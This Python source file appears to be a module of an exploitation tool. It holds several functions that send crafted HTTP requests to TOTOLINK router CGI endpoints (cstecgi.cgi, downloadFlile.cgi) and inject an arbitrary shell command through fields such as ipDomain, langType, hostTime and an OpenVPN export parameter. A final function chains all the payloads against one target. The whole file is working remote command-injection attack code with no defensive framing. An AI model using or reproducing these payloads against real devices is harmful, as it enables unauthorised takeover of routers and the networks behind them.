import json
from misc.session import *

def pwn1(ip, cmd, session):
    try:
        url="http://%s/cgi-bin/cstecgi.cgi"%(ip)

        command=cmd
        headers={
        	"User-Agent":"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/94.0",
        	"Accept-Language":"en-US,en;q=0.5",
        	"Accept-Encoding":"gzip, deflate",
        	"Content-Type":"application/x-www-form-urlencoded; charset=UTF-8",
        	"X-Requested-With":"XMLHttpRequest",
        	"Origin":"http://%s"%(ip),
        }
        data={
        	"topicurl":"setting/setDiagnosisCfg",
        	"actionFlag":"1",
        	"ipDomain":"www.baidu.com\n{}\n".format(command)
        }
        session.post(url,headers=headers,data=json.dumps(data)).text
        data={
        	"topicurl":"setting/setDiagnosisCfg",
        	"actionFlag":"1",
        	"ipDoamin":"www.baidu.com\n{}\n".format(command)
        }
        session.post(url,headers=headers,data=json.dumps(data)).text
        return True
    except Exception as e: return (False, e)

def pwn2(ip, cmd, session):
    try:
        url="http://%s/cgi-bin/cstecgi.cgi"%(ip)

        headers={
        	"User-Agent":"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/94.0",
        	"Accept-Language":"en-US,en;q=0.5",
        	"Accept-Encoding":"gzip, deflate",
        	"Content-Type":"application/x-www-form-urlencoded; charset=UTF-8",
        	"X-Requested-With":"XMLHttpRequest",
        	"Origin":"http://%s"%(ip),
        	}
        data={
        	"topicurl":"setting/setLanguageCfg",
        	"langType":"cn;{};".format(cmd)
        }
        session.post(url,headers=headers,data=json.dumps(data))
        return True
    except Exception as e: return (False, e)

def pwn3(ip, cmd, session):
    try:
        url="http://%s/cgi-bin/cstecgi.cgi"%(ip)

        headers={
        	"User-Agent":"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/94.0",
        	"Accept-Language":"en-US,en;q=0.5",
        	"Accept-Encoding":"gzip, deflate",
        	"Content-Type":"application/x-www-form-urlencoded; charset=UTF-8",
        	"X-Requested-With":"XMLHttpRequest",
        	"Origin":"http://%s/",
        }
        data={
        	"topicurl":"setting/NTPSyncWithHost",
        	"hostTime":"2021-11-11 10:34:09\"\n{}\n\"".format(cmd)
        }
        session.post(url,headers=headers,data=json.dumps(data))
        return True
    except Exception as e: return (False, e)

def totolinkAseries(ip, cmd, session):
    try:
        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 ',
            'Cache-Control': 'max-age=0',
            'Connection': 'keep-alive ',
            'Upgrade-Insecure-Requests': '1 ',
            'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0 ',
        }

        response = session.get(f'http://{ip}/cgi-bin/downloadFlile.cgi?payload=`{cmd}`', headers=headers)
        return True
    except Exception as e:
        return (False, e)

def totolinkN600R(ip, cmd, session):
    pwn1(ip,cmd,session)
    pwn2(ip,cmd,session)
    pwn3(ip,cmd,session)
    totolinkAseries(ip, cmd, session)
    try:
        url="http://%s/cgi-bin/cstecgi.cgi?exportOvpn=&type=user&comand=;%s;&filetype=gz"%(ip,cmd) #could comand be command? not changed yet
        headers={
	        "User-Agent":"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/94.0",
	        "Accept-Language":"en-US,en;q=0.5",
	        "Accept-Encoding":"gzip, deflate",
	        "Content-Type":"application/x-www-form-urlencoded; charset=UTF-8",
	        "X-Requested-With":"XMLHttpRequest",
	        "Origin":"http://%s/"%(ip),
        }
        session.post(url, headers=headers, verify=False, timeout=(5,2), allow_redirects=False)
        url="http://%s/cgi-bin/cstecgi.cgi?exportOvpn=&type=user&command=;%s;&filetype=gz"%(ip,cmd) #could comand be command? not changed yet
        session.post(url, headers=headers, verify=False, timeout=(5,2), allow_redirects=False)
        return True
    except Exception as e:
        return (False, e)